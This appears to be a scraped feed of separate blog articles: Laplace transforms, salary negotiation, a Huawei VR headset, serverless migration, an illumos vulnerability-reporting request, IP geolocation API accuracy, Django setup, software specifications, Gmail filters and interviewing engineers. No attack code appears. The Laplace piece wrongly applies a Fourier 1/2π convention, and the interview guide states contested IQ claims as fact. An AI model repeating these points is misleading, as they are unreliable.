href="https://mathvault.ca/math-glossary/#recursion" target="_blank" rel="noreferrer noopener">recursion</a> and <a aria-label="integration by parts (opens in a new tab)" href="https://mathvault.ca/integration-overshooting-method/#Integration_By_Parts" target="_blank" rel="noreferrer noopener">integration by parts</a>, would become:\[ \frac{n!}{(s-a)^{n+1}} \]Here, notice how the transforms of exponential and power function are both <strong>represented</strong> in the expression, with the factorial $n!$, the $1/(s-a)$ fraction, and the $n + 1$ exponent.</p><p>In fact, it turns out that we can integrate <em>any</em> function with the Laplace transform, as long as it does not <strong>diverge</strong> faster than the $e^{at}$ exponential. In the tables of Laplace transforms, you might have noticed the $\mathrm{Re}(s) \gt a$ condition. That is what the condition is alluding to.</p><h2><span id="A_Transform_of_Unfathomable_Power"></span><a href="#toc">A Transform of Unfathomable Power</a><span></span></h2><p>However, what we have seen is only the tip of the iceberg, since we can also use Laplace transform to transform the <strong>derivatives</strong> as well. In goes $f^{(n)}(t)$. Something happens. Then out goes:\[ s^n \mathcal{L}\{f(t)\}-\sum_{r=0}^{n-1} s^{n-1-r} f^{(r)}(0) \]For example, when $n=2$, we have that:\[ \mathcal{L}\{f^{\prime\prime}(t)\} = s^2 \mathcal{L}\{f(t)\}-sf(0)-f'(0) \]In addition to the derivatives, the $\mathcal{L}$ can also process some <strong>integrals</strong>: the integral sine, cosine and exponential, as well as the <a href="https://mathvault.ca/hub/higher-math/math-symbols/probability-statistics-symbols/#Continuous_Probability_Distributions_and_Associated_Functions" target="_blank" aria-label="error function (opens in a new tab)" rel="noreferrer noopener">error function</a> — to name a few.</p><p>But that’s not all. There is also the <strong><a aria-label="inverse Laplace transform (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/#Key_Transforms" target="_blank">inverse Laplace transform</a></strong>, which takes a frequency-domain function and renders a time-domain function.</p><p>In fact, performing the transform from time to frequency and back once introduces a factor of $1/2\pi$. Sometimes, you’ll see the whole fraction in front of the inverse function, while other times, the transform and its inverse share a factor of $1/\sqrt{2\pi}$.</p><p>This is as if the Kraken could restitute the boat intact — but only for a factor of $1/2\pi$.</p><p>The Laplace transform, even after all those years, never ceases to bring us awe with its power.

October 26, 2020 | http://cushychicken.github.io/what-to-say-when-asked-salary-history/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/what-to-say-when-asked-salary-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: “I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p><p>Reddit has been awash with posts of people getting asked for their salary history while job hunting. These posts are popping up on all sorts of subreddits. I’ve seen folks write about it in /r/personalfinance, /r/engineering, and even a bit in /r/ECE. There has been <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">a reasonable amount of ink spilled on salary negotiation online</a>, and nearly all of the advice agrees: <em>absolutely do not disclose your salary history to a prospective employer.</em> The anchoring effect of disclosing what you’re paid now naturally ties a follow-on offer to that salary.</p><p>Sorry, I slipped into manager-speak there. Let me rephrase that, in plain English. Disclosing your salary can turn a potential double digit raise when changing jobs to a few percent raise. You could leave thousands, or even <em>tens</em> of thousands of dollars on the table.</p><p>At the time of this writing, it’s still completely legal for a prospective employer to ask for salary history in <a href="https://www.hrdive.com/news/salary-history-ban-states-list/516662/">over half of the states in the USA</a>. I’m fortunate enough to live in Massachusetts, where asking for salary history has been illegal since 2018. In theory, this question isn’t a problem for me any more. In reality, it’s just changed shapes. Like a nasty cold, the question has just mutated into a new form. Instead of asking: “What is your current salary?”, prospective employers instead ask “What’s your <em>expectation</em> around salary?”</p><p>This is completely legal, but if you’re not cagey about it, you could cheerfully volunteer too much information about yourself. No law is broken if you say: “Well, I currently make <em>X dollars per year</em>, so I’d expect that plus <em>arbitrary percentage raise</em>.” Make no mistake: once you’ve given a number, it’s all over. A recruiter only hears the salary you volunteered to them. The clearest symptom of this is receiving job offers of your current salary, plus $5k or 5%.</p><p>(<strong>Note:</strong> When I say “recruiter” here, I’m referring to a recruiter or other HR professional working in-house at a company. This advice doesn’t really apply to recruiting and placement agencies. Since agency fees are based on a percentage of your salary upon getting hired, the incentives are aligned for them to ask for more money on your behalf. When you make more, they make more. Indeed, agency recruiters can be valuable information brokers. I’ve had agency recruiters tell me, completely voluntarily, that they’ve been trying to fill the position you’re discussing for six months. That’s <em>extraordinary</em> leverage for a qualified candidate.)</p><p>This potentially leaves you with a <em>boatload</em> of money on the table. Suppose, for a moment, that your skillset is one that this company desperately needs. As a result, your skillset is likely delivering way more value to that prospective employer at the margin. This means it’s a good idea for them to <em>pay you more money</em> to do your thing for them. By telling them what you get paid now, you peg the start of negotiations to that number, and give them a <em>huge discount</em> on your <em>very valuable</em> services.</p><p>Enough rambling about negotiating, and on to some practical advice! I’ve found a great turnabout phrase for being asked your salary history, or your salary expectations. Here’s what I’ve got:</p><blockquote><p>“I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p></blockquote><p>This is an excellent response, for three reasons.</p><ol><li>It offers no information <em>at all</em> about your current compensation.</li><li>It puts the person who asked you at an informational disadvantage. It shows that your counterparty is getting closer to a “yes”. Prioritizing good mutual fit in your response telegraphs to them that you are not convinced yet. This is a better negotiating position for you: making them work to convince you gives you <em>leverage.</em></li><li>It frequently yields a response in the form of the salary range that the employer is working with. I suspect this is out of a combination of surprise at being asked, and wanting to help make a good impression with you, the candidate, after learning that they haven’t convinced you to join yet.</li></ol><p>Got any other hot tips and tricks for salary negotiation? I’d love to hear them.</p><p>Also - that link I included above to Patrick McKenzie’s <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">blog post on salary negotiation</a>? Go read it. It’s excellent, and it <em>will</em> make you more money.</p></div></div>]]>

            <p>In 2019 Huawei announced their VR Glasses, a slim form factor VR headset that could be paired to a smartphone or a PC. It was a remarkable paired down and sleek looking device, unfortunately it only had 3DoF. In their announcement late last week Huawei <a href="https://www.gizmochina.com/2020/10/19/huawei-unveils-the-vr-glass-6dof-game-set-equipped-with-a-360-degree-joystick/">unveiled their upgraded headset</a> which promises 6DoF.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Apparently this is the new 6DoF version of HUAWEI VR glass. <a href="https://t.co/JblDbVAqE7">pic.twitter.com/JblDbVAqE7</a></p>— Kevin Pan (@rereflux) <a href="https://twitter.com/rereflux/status/1318097398728589313?ref_src=twsrc%5Etfw">October 19, 2020</a></blockquote>

</figure><p>The upgrade is comparable to the shift from the Oculus Go to Oculus Quest. Three degrees of freedom (3DoF) only tracks very basic head movements, six degrees of freedom (6DoF) allows the user to fully move around in the virtual space.</p><p>The headset also comes with two 6DoF controllers that look suspiciously similar to the Oculus Touch controllers. They are able to be stacked together along with the headset for easy storage. As for the headset itself, it has not changed since the first version in 2019 save for the inclusion of two tracking cameras.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Video of said headsets controllers locking in. <a href="https://t.co/wJdX4tSeIG">pic.twitter.com/wJdX4tSeIG</a></p>— Nikk Mitchell 🛸 (@nikkmitchell) <a href="https://twitter.com/nikkmitchell/status/1318514593598107649?ref_src=twsrc%5Etfw">October 20, 2020</a></blockquote>

</figure><p>The announcement was made at the World VR Industry Conference Cloud Summit in Nanchang, China. Not a lot of info about the product was specified but we did see a few tweets from China based VR developers who attended the event. According to what little information that we have, the headset will be sent out to developers later this year and the consumer release is set to be around April 2021. The price has not been announced but last years VR Glass was priced at around $424, the improvements will certainly increase the price.</p><p>Disappointingly, it does not look like the VR Glass will see any store shelves outside of mainland China. The first iteration of the VR Glass was not made available for purchase internationally and if the sanctions against the company are anything to go by, it doesn’t look like this version will either.</p>

				<p><a href="https://fatihacet.com/">Fatih Acet</a> is the CTO and co-founder of <a href="https://superpeer.com/">Superpeer</a> and employee number 40 at GitLab.</p><p>He recently came on <a href="https://w.cto.ai/theopsshow">The Ops Show</a> to discuss how he used a serverless strategy to scale his engineering team to 17 developers.</p><p>The video below gives his entire explanation, but below I’ll break it down into steps for ease.</p><!--kg-card-begin: embed--><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/3C3buRWlEvA?start=120&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-end: embed--><p>So, how to do serverless right and save money doing it. Here we go:</p><h2 id="step-1">Step 1</h2><p>Fatih describes himself as a T-shaped Frontend Engineer. That means his expertise goes deep while his collaboration goes wide. He initially wanted to use MEAN stack but then decided to go serverless. With his previous experience with AWS, he found AWS confusing and hard to manage so he decided to go with GCP. Instead of Mongo, he chose Firestore and also Cloud Function. With the first site launch, they had around 30 Cloud Functions.</p><!--kg-card-begin: image--><figure><img src="https://lh6.googleusercontent.com/D7fzfyiFckoQX6LrGCjVnnraYs2WkF6K1msWCzpWRaCPJKSHs_WEMxG1FEpgaaqcooere7EArr9KfRJumjfZAK9Vte-l3Y-pwp6pzoNXkN7an_oIw2qZZjb6ZC3nhfJOw6VqqDuu"></figure><!--kg-card-end: image--><h2 id="step-2">Step 2</h2><p>He used the Cloud Functions for the application backend. However, because of the cold starts, accepting a booking (Superpeer allows mentoring calls to be booked) was taking around 8s, 6s spent for the cold starts. A Cloud Function instance can only handle one concurrent request so a cold start was unavoidable.</p><h2 id="step-3">Step 3</h2><p>Eventually, they built up to 85 Cloud Functions and deployment became an issue, too. Cloud Function deployments are done one by one and take around 25 minutes to be completed. Application Frontend can only be deployed after all of the Cloud Function deployments are completed. However, there was an over 20-minute difference between the first and the last Cloud Function deployment.</p><h2 id="step-4">Step 4</h2><p>They started to migrate to Cloud Run. Cloud Run can handle 80 concurrent requests. Also, deployment of Cloud Run is a lot easier since it’s a containerized application deployments happen at the same time.</p><h2 id="step-5">Step 5</h2><p>Recently, Cloud Run started to allow you to keep a number of instances always-on and he set the minimum instance count to 5 and<strong> </strong>got the system down to no cold starts. The maximum number of instances is set to 1,000 to allow almost infinite scaling.</p><h2 id="step-6">Step 6</h2><p>After deployment of the Cloud Run, accepting a booking down to 300 milliseconds instead of 8 seconds with Cloud Functions. This made a huge impact on the application’s perceived performance.</p><h2 id="step-7">Step 7</h2><p>20 Cloud Functions are still remaining for async stuff. For example, resizing uploaded images or transcribing uploaded videos, and sending email. All application backend moved to Cloud Run. This is where Fatih made it to the true future of serverless.</p><!--kg-card-begin: image--><figure><img src="https://lh5.googleusercontent.com/JIWODkiOAscLYTYutCbOIpjUVjKRNoEB_eHFm_8n720ePPuoylxxEcCOWxlr3HHeOF_kwAEeIWc_ePCwHhHJmGLK-ITP5YlhrNJccqKGAkTVYX3WEDgDbipmfS03jQrvxjqySqDF"></figure><!--kg-card-end: image--><p>Fatih’s serverless approach helped him to scale his engineering team to 17 members because he didn’t need to worry about scaling the infrastructure anymore. He could be sure the system will perform as expected when doing their larger launches like what they did with ProductHunt.</p><h2 id="expenses">Expenses</h2><p>Serverless expenses are low for Superpeer right now. Last month their staging and production costs were around $200 total. The free quota offering from GCP is also very generous, he adds.</p><!--kg-card-begin: image--><figure><img src="https://lh6.googleusercontent.com/SK0_33KtsA-ZgjrIEQuzpHsBuetqRmr0bANO3XTVgg_7xNMG-IS-7wmC-X5BmIjWMT7XY7MEilYjFio8cNSK4_qR-nS_Z6ImjP4DqFq6XOB8EtuDBGNXU01AtiEcBSFYvsGjkvgw"></figure><!--kg-card-end: image--><p>So, that’s it. Fatih’s serverless approach is saving him hundreds, if not thousands, with enhanced velocity and observability.</p><p>This is the type of approach that we believe in at CTO.ai. Simple workflows that are tracked, observable, and collaborative. If you’d like to try out The Ops Platform to make your serverless journey easier, let us know by sending us a note below:</p><!--kg-card-begin: html--><!--[if lte IE 8]>

<![CDATA[A Request to Security Researchers from Illumos]]>

<h3>A Gentle Reminder About illumos</h3>
<p>A very bad security vulnerability in Solaris was patched-and-announced by Oracle earlier this week.  Turns out, we in open-source-descendant <a href="https://illumos.org/">illumos</a> had something in the same neighborhood. We can’t confirm it’s the same bug because reverse-engineering Oracle Solaris is off the table.</p>
<p>In general if a vulnerability is an old one in Solaris, there’s a good chance it’s also in illumos.  Alex Wilson said it best in this recent tweet:</p>

<blockquote><p lang="en" dir="ltr"><a href="https://twitter.com/anthomsec?ref_src=twsrc%5Etfw">@anthomsec</a> Hi! re: 2020-14871 (Solaris PAM bug), do you know if this was in the OpenSolaris PAM that went into illumos (<a href="https://t.co/Rxs5ct09xs">https://t.co/Rxs5ct09xs</a>) by any chance? We don't get any info via Oracle, but we do inherit their bugs if they're old enough :(</p>— Alex Wilson (@arekinath) <a href="https://twitter.com/arekinath/status/1319176485572202496?ref_src=twsrc%5Etfw">October 22, 2020</a></blockquote>  

<p>If you want to see the full history, the first 11 minutes of my <a href="https://archive.fosdem.org/2016/schedule/event/illumos_overview">talk from 2016’s FOSDEM</a> contains WHY a sufficiently old vulnerability in Solaris 10 and even Solaris 11 may also be in illumos.</p>
<p>Remember folks, Solaris is closed-source under Oracle, even though it used to be open-source during the last years of Sun’s existence.  illumos is open-source, related, but NOT the same as Solaris anymore.  Another suggested talk covers this rather well, especially if you <a href="https://www.youtube.com/watch?v=-zRN7XLCRhc&amp;t=33m">start at the right part</a>.</p>
<h3>The Actual Request</h3>
<p>Because of this history and shared heritage, if you’re a security researcher, PLEASE make sure you find <a href="https://openindiana.org/">one</a> <a href="https://omniosce.org/">of</a> <a href="https://smartos.org/">many</a> <a href="https://illumos.org/">illumos</a> distributions, install it, and try your proof-of-concept on that as well.  If  you find the same vulnerability in illumos, please report it to us via the <span>security@illumos.org</span> mailing alias.  We have a <a href="https://illumos.org/docs/security">PGP key</a> too!</p>
<p>Thank you, and please test your Solaris exploits on illumos too (and vice-versa). </p>

			<!-- 2622 --><h2>Origin Story</h2><p>
I have a side-project I've been running for several years called <a href="http://giacomoballi.com/findtower" target="_blank">FindTower</a>. It helps people camping or hiking to locate cellular towers around them.
<br>People with RVs also use it better position their antennas.
<br>The app obviously requires the user's location in order to load a map and position relevant towers.
<br>A common issue is that sometimes, on first load, a user might not grant GeoLocation authorization and therefore everything else gets stumped.
<br>As a fall back, the app uses the IP address to at least have a rough idea of the user's location.
<br>Over the years, I've tried multiple services offering this. Recently, I noticed many new public APIs offering this have popped up.
<br>Honestly an approximate location is fine to showcase how the app works (before I instruct the user on how to grant GPS access).
</p><center>
<img src="http://giacomoballi.com/files/FindTowerSS2.jpg">
<img src="http://giacomoballi.com/files/FindTowerSS3.jpg">
</center>
<p>However, this morning I was curious to see how all these APIs compare... So I decided to test all of them 😄
<br>I'm sure there are more but for this first iteration I will be taking into account the following:
</p><ul>
	<li><a href="https://www.abstractapi.com/ip-geolocation-api">AbstractAPI</a></li>
	<li><a href="https://www.bigdatacloud.com/ip-geolocation-apis">BigDataCloud</a></li>
	<li><a href="https://tools.keycdn.com/geo">KeyCdn</a></li>
	<li><a href="https://ip-api.com/">Ip-Api</a></li>
	<li><a href="https://ipapi.com/">IpApi</a></li>
	<li><a href="https://ipdata.co/">IpData</a></li>
	<li><a href="https://ipinfo.io/">IpInfo</a></li>
	<li><a href="https://ipstack.com/">IpStack</a></li>
	<li><a href="https://labstack.com/">LabStack</a></li>
	<li><a href="https://developers.google.com/maps/documentation/geolocation/overview">Google</a></li>
</ul>
<h2>The process</h2>
<ol>
<li>I always use a VPN so the first step was to find my real IP address assigned by the ISP.</li>
<li>Queried all the APIs for the same IP and saved the results.</li>
<li>Find my true coordinates. I opened google maps, clicked on my location and grabbed the latitude and logitude.</li>
<li>Calculate the distance (ie error) between all the returned coordinates and my true location. In FindTower I have a helper function to calculate the distance between two coordinates "as the crow flies" so it was pretty quick.</li>
</ol>

<h2>Results</h2><p>
Granted results will vary due to many factors, I always like to have a general idea of the reliability of the data I'm using to always reduce error margins at every stage of a process.
<br>Here is by how much the APIs were "off" (in kilometers) given my true coordinates:
</p><pre>[Log] AbstractAPI: 157.52246741097514
[Log] BigDataCloud: 1.920934529098657
[Log] KeyCdn: 2.09610383290298
[Log] Ip-Api: 2.2877973316608484
<b>[Log] IpApi: 0.2635768468879036</b>
[Log] IpData: 2.09610383290298
[Log] IpInfo: 6.296544013303361
<b>[Log] IpStack: 0.2635768468879036</b>
[Log] LabStack: 0.4548823247110428
[Log] Google: 2.09610383290298
</pre>

<p><i>→ Interesting to note IpApi and IpStack are exactly the same, perhaps they rely on the same system.</i></p><h2>Conclusion</h2><p>
So there you have it. Most APIs tested have satisfactory results: coordinates are within 2km (little over a mile) from the true location.
The test was performed in San Francisco where there are many ISP nodes and samples therefore it's easier to obtain an accurate reading.</p><p>#App, #IP, #GeoLocation, #API</p><p>Published: Mon Oct 26 2020 11:53:34 GMT-0700 (PDT)</p>		</div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this tutorial, you would learn how to quickly install django, start a django project, and run your project on a server.</span></p>

<p><span>Django is one of the most popular open-source web development framework written in Python.</span></p>

<p><span>It is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.</span></p>

<p><span>To use django, python is required therefore you must have python installed and perhaps an ide like pycharm or Anaconda. An IDE is not mandatory but they improve your productivity.</span></p>



<div>
<p><span>Note: IDE - Integrated Development Environments - is a software application that provides comprehensive facilities to computer programmers for software development.</span></p>

<p><span>Examples of IDEs for Python is Pycharm and Anaconda</span></p>
</div>

<p><span>Though the tutorial is aimed at starting a Django project in pycharm, <span>the process is very similar in other IDEs</span>.</span></p>



<h3><span>Installing Django</span></h3>

<p><span>Start with creating a new python project in pycharm. Pycharm <span>automatically creates a virtual environment</span> for handling your packages.</span></p>

<p><span>Open the <span>terminal</span> which can be opened from the bar at the bottom of the window. It will open a command line.</span></p>

<p><span>Then run the following code to install django:</span></p>

<pre><code>pip install django</code></pre>



<p><span>This installs the django package for your project.</span></p>

<p><span>Installation of packages using pip requires an internet connection.</span></p>



<h3><span>Creating a Django Project</span></h3>

<p><span>To create a django project, go back to the terminal and run the following command:</span></p>

<pre><code>django-admin startproject myproject</code></pre>

<p><span><code>myproject</code> is the name of your Django project, you could replace it with any name.</span></p>



<p><span>After running this command, <span>Django automatically creates some new files</span>: a new directory called <span>“myproject”</span> with the basic Django directory and structures:</span></p>

<pre><code>myproject/
    myproject/
        __init__.py
        settings.py
        urls.py
        asgi.py
        wsgi.py
    manage.py</code></pre>



<p><span>These files are:</span></p>

<ul>
	<li><span>The outer <code>myproject/</code> root directory is a container for your project.</span></li>
	<li><span><code>manage.py</code>: A command-line utility that lets you interact with this Django project in various ways.</span></li>
	<li><span>The inner <code>mysite/</code> directory is the actual Python package for your project.</span></li>
	<li><span><code>myproject/__init__.py</code>: An empty file that tells Python that this directory should be considered a Python package. If you’re a Python beginner, read <a href="https://docs.python.org/3/tutorial/modules.html#tut-packages" title="(in Python v3.9)">more about packages</a> in the official Python docs.</span></li>
	<li><span><code>myproject/settings.py</code>: Settings/configuration for this Django project</span></li>
	<li><span><code>myproject/urls.py</code>: The URL declarations for this Django project; a “table of contents” of your Django-powered site.</span></li>
	<li><span><code>myproject/asgi.py</code>: An entry-point for ASGI-compatible web servers to serve your project.</span></li>
	<li><span><code>myproject/wsgi.py</code>: An entry-point for WSGI-compatible web servers to serve your project.</span></li>
</ul>



<p><span>You should not worry about understanding what these files are.</span></p>



<h3><span>Running a Django project</span></h3>

<p><span>Now that we have created a Django project we can open it in a browser. Django comes with a built-in web server for development.</span></p>

<p><span>Navigate to the Base directory where <code>manage.py</code> is by running the following command in the terminal.</span></p>

<pre><code>cd myproject</code></pre>

<p><span>Then run the command below</span></p>

<pre><code>python manage.py runserver</code></pre>

<p><span>After this command runs successfully, it would give you a link to access your Django project<code> http://127.0.0.1:8000/ </code><span>open this link in a browser. </span></span></p>



<p><span>If everything went right you should see the default page of Django.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Specifications work in two ways: they inform developers what needs to be built, and they constrain the problem space so that tasks become approachable.</p>

<p>Without clear specifications, developers may build the wrong software, or they may take too long building more software than the customers actually need.</p>

<p>On the other hand, specifications which include too much detail can be damaging to the software’s architecture and the program’s usability. When specifications include too much detail, they constrain the problem space in such a way as to limit the user’s actions unnecessarily. Excessive detail also requires programmers to handle edge-cases in complicated ways, often adding unnecessary indirections, which make the program’s execution flow more complex, and thus harder to debug.</p>

<p>Imagine you’re implementing an operating system, for example. If specifications for its filesystem describe which actions users would like to perform, programmers can create elegant abstractions to solve the problem. On the other hand, if specifications include too many edge-cases, the system becomes inflexible and limits user interaction. Additionally, it’s harder to create non-<a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">leaky abstractions</a>.</p>

<p><strong>Good specification is short and concise and needs to be complemented by giving developers the necessary amount of context about who the software’s users are and what these users want.</strong></p>

<p>In general, the more developers distance themselves from users, the more difficult it becomes to build software which fulfils those users’ needs.</p>

<p>If you look at companies like <a href="https://stripe.com/">Stripe</a>, for example, you’ll see that their engineers deeply care about their users, and are kept close to them. That’s why Stripe’s built such a brilliant product.</p>

<p>Keeping developers close to users means that, given a minimal amount of specification, those developers can figure out what are the boundaries of what they need to build.</p>

<p>Instead of describing every minimal detail and edge-case, <strong>good specification focuses on intents and outcomes</strong>. It relies on the developer to think about possible edge-cases and empower their users with flexible functionality, which usually leads to software that’s more elegant and useful.</p>

<p>Additionally, outcome-focused specifications reduce communication overhead between product and software development teams. Instead of having to ask product about every single edge-case, this kind of specification empowers developers to think about what’s best for the user.</p>

<p>However, depending on what developers will build, they may need specifications which go beyond intents and outcomes.</p>

<p>When developing, back-end services, for example, text-based stories are enough. On the other hand, developers working on front-end applications need designs so that they can build pleasant experiences, and schema definitions so that they can interface with data-provider services.</p>

<p>That’s why I’d recommend teams to use tools like <a href="https://zeplin.io/">Zeplin</a> or <a href="https://figma.com/">Figma</a> to smoothen design handover, or <a href="https://mockoon.com/">mock-api tools like Mockoon</a> (whose tutorials are available <a href="https://mockoon.com/tutorials/">here</a>) to smoothen the development process of applications which fetch data from a RESTful API.</p>

<p>Useful and elegant software understands their users and is <a href="https://www.youtube.com/watch?v=pMuiVlnGqjk">built upon their language</a>, not on a vacuum.</p>

<p>All code needs a purpose.</p>





<p>This post’s title is a reference to Tolstoy’s <a href="https://www.goodreads.com/book/show/21206786-how-much-land-does-a-man-need"><em>“How much land does a man need?”</em></a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>A fair share of my waking hours involves communicating with other people on GitHub to make sure we’re solving the right problems, and that we’re solving them the right way.</p>

<p>As a result, I receive many email notifications about various things that happen on there: <span>direct requests to review a particular piece of code</span>, <span>feedback on pull requests I’ve opened</span>, <span>pull requests merged by their authors</span>, <span>people directly mentioning our username in a comment</span>, <span>issues closed by their authors</span>, etc. I receive hundreds of emails every single week.</p>

<p>Now here’s the thing: some of these emails are more time-sensitive and/or actionable than others. We should probably address <span>direct requests to review a particular piece of code</span> first, since someone is explicitly asking for our attention and not responding promptly would likely prevent them from shipping something swiftly. Conversely, I’ll want to delete (or at least deprioritize) email notifications communicating that a given <span>pull request was merged by its author</span> - there’s no actionable to derive from it, so in the bin it goes.</p>

<p>However, by default, all these email notifications arrive in our inboxes with the same perceived level of importance, which makes it difficult to identify what I should address next.</p>

<p><strong>This post presents a solution to this problem</strong>: using Gmail filters, we can automatically add labels to GitHub notification emails based on their content. This solution takes less than 10 minutes to implement, and the long-term return on investment is quite appreciable.</p>

<p>Here’s how my inbox looks like with automatic labeling set up:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b5eb240fc484167ca5540f1786e678940a18c70d/19b6a/assets/github-labels.png" alt=""></p>

<p>Pretty neat, right? Thanks to these labels, I’m able to quickly parse through emails and reach inbox zero every day.</p>

<p>Let’s see how to implement this solution with Gmail.</p>

<h2 id="1-download-the-xml-filters-template">1. Download the XML filters template</h2>

</code></pre></div></div>

<h2 id="2-edit-the-template-with-your-information">2. Edit the template with your information</h2>

<p>In the template, replace the following string:</p>

<ul>
  <li><code>@&lt;YOUR_GITHUB_USERNAME_HERE&gt;</code> (in my case that would be <code>@maximevaillancourt</code>)</li>
</ul>

<p>If you’re part of a GitHub team that other people mention in issues and pull requests, also replace the following string:</p>

<ul>
  <li><code>@&lt;YOUR_GITHUB_TEAM_NAME_HERE&gt;</code> (for example, <code>@my-organization/best-team-ever</code>)</li>
</ul>

<p>If you’re not part of a GitHub team, remove the <code>&lt;entry&gt;</code> node that looks for this pattern.</p>

<p>Finally, save the XML file.</p>

<h2 id="3-import-the-xml-filters-in-gmail">3. Import the XML filters in Gmail</h2>

<p>Now that your template is ready, it’s time to import it in your Gmail account.</p>

<p>Open up your Gmail settings, and click on the “Filters” tab. Once you’re there, find the “Import filters” link near the bottom of the pane. Select the XML file you just modified and upload it. Review the filters and and confirm the import.</p>

<p>That’s it - you’re done. At this point, your emails should be labeled automatically. Feel free to change the colors of the labels via the “Labels” tab in your Gmail settings. I find it helpful to make <span>direct review requests</span> red as this means “urgent and important” to me, and the label for <span>merged pull requests</span> is green because it means “success, everything’s good” to me.</p>

<p>Experiment to find what works best for you.</p>

<p>If you found this helpful, consider sharing it with your coworkers and friends. I’m always available on Twitter (<a href="https://twitter.com/vaillancourtmax">@vaillancourtmax</a>) to discuss. ✌️</p>

October 26, 2020 | https://www.spakhm.com/p/how-to-interview-engineers | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/how-to-interview-engineers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This is my super secret proprietary no-nonsense guide on how to interview engineers. <em>Another</em> guide? Yes, because today's interviews are filled with posturing, political correctness, and small socially convenient falsehoods that have everything to do with large company recruiting constraints and nothing to do with you. Microsoft started it, FAANG cloned it, and everyone else cloned FAANG. If you're basing your interviews on industry standard practices, you're now three levels of <a href="http://calteches.library.caltech.edu/51/2/CargoCult.htm">cargo-culting</a> deep.</p><p>This guide is for interviewing very talented people. It's applicable if you're building an extraordinary team at a hard technology startup. If your startup is technology-enabled, or you're designing an interview process at a large company, or you're hiring for well-established roles to do specialized tasks, this guide isn't for you. You will not find references to "junior vs senior" or "front-end vs back-end" here. From the perspective of what we're trying to accomplish, specialization is for insects.</p><p>There are three things you need to determine about a candidate: talent, judgement, and personality. Think of hiring an engineer as if you're buying a race car. The first thing you must look for in a race car is horsepower, because without horsepower the car is useless for racing. The horsepower of engineers is talent. Without talent, engineers are useless for building products, so it's the first thing you must look for in a candidate. It doesn't matter how nice the person is, or how hard-working. No horsepower, no race.</p><p>Talent alone is insufficient. The world is filled with talented people who never get anywhere for a myriad reasons. Laziness, anxiety, fragility, impulsivity, egotism, victimhood, just to list a few. So once you've identified talent, you have to determine the shape and quality of its vessel. Where will the person direct their talent? And are they well-adapted to the demands of the external world?</p><h4>Talent</h4><p>Talent is a combination of speed, working memory, taste, knowledge of the toolchain, understanding how computers work, and ability to program. It's IQ, but specialized for engineers. IQ is <a href="https://en.wikipedia.org/wiki/Heritability_of_IQ">50-80% heritable</a>, <a href="https://www.gwern.net/Drug-heuristics">impossible to improve</a>, <a href="https://en.wikipedia.org/wiki/IQ_classification">normally distributed</a>, and <a href="https://infoproc.blogspot.com/2008/07/annals-of-psychometry-iqs-of-eminent.html">strongly correlated</a> with success in fields like science and engineering.</p><p>This matters for candidate selection because someone can improve within their talent band, but they can't jump talent bands. A person with IQ of 145 (σ=3) is dramatically better than a person with IQ of 115 (σ=1). If you watch both people work, it's like they're from different galaxies. So your job as an interviewer is to find out the candidate's talent band.</p><p>Here's how you do that. Tell the candidate in advance to have a laptop with their favorite development environment ready. They can use any operating system, any editor, any programming language— whatever makes them the most comfortable.</p><p>When the interview starts, have them share the screen. You'll be watching as they type. Then, give them a problem. The one I gave for years is to write a program that plays every possible tic-tac-toe game, and then prints the number of valid games. You should make up your own problem, but this is roughly the difficulty you're shooting for, give or take. The candidate's goal is to write the program, compile it, run it, and get it to produce the correct answer.</p><p>Take note of the time and let them do their thing. Answer any questions they might have as they go. The moment the program outputs the correct answer, take note of the time again. That's all you have to do to evaluate how talented the candidate is. The technical aspect of the interview is over. (Yes, you read that right!)</p><p>Here is what will happen. The most talented candidates will think about it for a few seconds, then write the program as fast as they can type (and they'll type fast). You can almost sense their frustration because they think way faster than the keyboard allows them to interface with the computer. Typing speed is their bottleneck. When they're done typing, they'll probably have a few compiler errors and runtime bugs that they'll fix instantly. Have them compare their result with the answer on Google. If the answers don't match, they'll look at the program for a few seconds, exclaim "oh, right!", fix the bug, rerun the program and get the correct answer. The whole process will take about 10 minutes from start to finish.</p><p>Slightly less talented candidates will do the same thing, but a little slower. You'll get a sense that their thinking speed and typing speed are balanced— neither is the bottleneck. They might take a bit longer to iron out the bugs and spot the mistake if the program doesn't give the correct answer the first time they run it. They'll get the whole thing done in 15 minutes. Maaaybe 20, if they're having a bad day.</p><p>The rest of the candidates will type much more slowly than they normally could. They're capable of much faster typing speed, but the speed of their thinking is the bottleneck. For our purposes, that's a no hire. When you sense that, let them keep working for 15 minutes to save face, then politely interrupt them, thank them for their time, and hang up. The silver lining of the pandemic is that you no longer have to be in a situation where you find out five minutes into the interview the candidate isn't good, and then waste everyone's time for a few more hours because it's too awkward to send them home.</p><p>Note that this interview question covered everything we defined as talent— speed, working memory, knowledge of the toolchain, understanding how computers work, and ability to program. To evaluate taste you have to pay attention to their code, choice of tools, and the thinking process as they write the program. But you could probably ignore all that. I've never met a candidate who could solve this problem in less than 15 minutes but had no taste. Like IQ, the various aspects of talent that you want in a candidate tend to be tightly correlated. When they have a couple of desired qualities in abundance, they usually have the rest.</p><h4>Aside</h4><p>Let me pause for a moment and answer a few frequently asked questions.</p><p>First, I cannot myself pass this interview. Last time I tried, I got the correct answer 